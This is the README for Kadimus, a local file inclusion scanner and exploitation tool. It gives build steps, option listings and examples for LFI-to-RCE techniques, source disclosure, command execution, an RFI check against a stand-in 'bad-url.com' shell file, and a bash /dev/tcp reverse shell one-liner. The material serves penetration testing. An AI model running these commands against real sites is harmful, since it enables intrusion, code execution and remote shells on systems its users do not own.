 [![Rawsec's CyberSecurity Inventory](https://inventory.rawsec.ml/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.rawsec.ml/tools.html#Kadimus)
 [![GitHub stars](https://img.shields.io/github/stars/P0cL4bs/Kadimus.svg)](https://github.com/P0cL4bs/Kadimus/stargazers)
 [![GitHub license](https://img.shields.io/github/license/P0cL4bs/Kadimus.svg)](https://github.com/P0cL4bs/Kadimus/blob/master/license.txt)

# Kadimus
LFI Scan &amp; Exploit Tool
--
Kadimus is a tool to check sites to lfi vulnerability , and also exploit it

Features:

- [x] Check all url parameters
- [x] /var/log/auth.log RCE
- [x] /proc/self/environ RCE
- [x] php://input RCE
- [x] data://text RCE
- [x] Source code disclosure
- [x] Multi thread scanner
- [x] Command shell interface through HTTP Request
- [x] Proxy support (socks4://, socks4a://, socks5:// ,socks5h:// and http://)
- [x] Proxy socks5 support for bind connections

## Compile:

```sh
$ git clone https://github.com/P0cL4bs/Kadimus.git
$ cd Kadimus
```

You can run the configure file:

```sh
./configure
```

Or follow this steps:

### Installing libcurl:
* CentOS/Fedora

```sh
# yum install libcurl-devel
```

* Debian based

```sh
# apt-get install libcurl4-openssl-dev
```

* Mac OS X based

```sh
$ brew install openssl
```

### Installing libpcre:
* CentOS/Fedora

```sh
# yum install pcre-devel
```

* Debian based

```sh
# apt-get install libpcre3-dev
```

* Mac OS X based

```sh
$ brew install pcre
```

### Installing libssh:

* CentOS/Fedora

```sh
# yum install libssh-devel
```

* Debian based

```sh
# apt-get install libssh-dev
```

* Mac OS X based

```sh
$ brew install libssh
```

### And finally:

```sh
$ make
```
## Options:

```
  -h, --help                    Display this help menu

  Request:
    -B, --cookie STRING         Set custom HTTP Cookie header
    -A, --user-agent STRING     User-Agent to send to server
    --connect-timeout SECONDS   Maximum time allowed for connection
    --retry-times NUMBER        number of times to retry if connection fails
    --proxy STRING              Proxy to connect, syntax: protocol://hostname:port

  Scanner:
    -u, --url STRING            URL to scan/exploit
    -U, --url-list FILE         File contains url list to scan
    -o, --output FILE           File to save output results
    -t, -threads NUMBER         Number of threads (2..1000)

  Explotation:
    --parameter STRING          Parameter name to inject exploit
                                (only needed by RCE data and source disclosure)

  RCE:
    -T, --technique=TECH        LFI to RCE technique to use
    -C, --code STRING           Custom PHP code to execute, with php brackets
    -c, --cmd STRING            Execute system command on vulnerable target system
    -s, --shell                 Simple command shell interface through HTTP Request

    --connect STRING            Ip/Hostname to connect
    -p, --port NUMBER           Port number to connect or listen
    -l, --listen                Bind and listen for incoming connections

    --ssh-port NUMBER           Set the SSH Port to try inject command (Default: 22)
    --ssh-target STRING         Set the SSH Host

    RCE Available techniques

      environ                   Try run PHP Code using /proc/self/environ
      input                     Try run PHP Code using php://input
      auth                      Try run PHP Code using /var/log/auth.log
      data                      Try run PHP Code using data://text

    Source Disclosure:
      -S, --get-source          Try get the source file using filter://
      -f, --filename STRING     Set filename to grab source [REQUIRED]
      -O FILE                   Set output file (Default: stdout)

```

## Examples:

### Scanning:
```
./kadimus -u localhost/?pg=contact -A my_user_agent
./kadimus -U list.txt --threads 10 --connect-timeout 10 --retry-times 0
```
### Get source code of file:
```
./kadimus -u localhost/?pg=contact -S -f "index.php%00" -O local_output.php --parameter pg
```
### Execute php code:
```
./kadimus -u localhost/?pg=php://input%00 -C '<?php echo "pwned"; ?>' -T input
```

### Execute command:
```
./kadimus -t localhost/?pg=/var/log/auth.log -T auth -c 'ls -lah' --ssh-target localhost
```
### Checking for RFI:

You can also check for RFI errors, just put the remote url on resource/common_files.txt
and the regex to identify this, example:


```php
/* http://bad-url.com/shell.txt */
<?php echo base64_decode("c2NvcnBpb24gc2F5IGdldCBvdmVyIGhlcmU="); ?>
```

in file:
```
http://bad-url.com/shell.txt?:scorpion say get over here
```

### Reverse shell:
```
./kadimus -u localhost/?pg=contact.php -T data --parameter pg -l 12345 -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0>&1' --retry-times 0
```
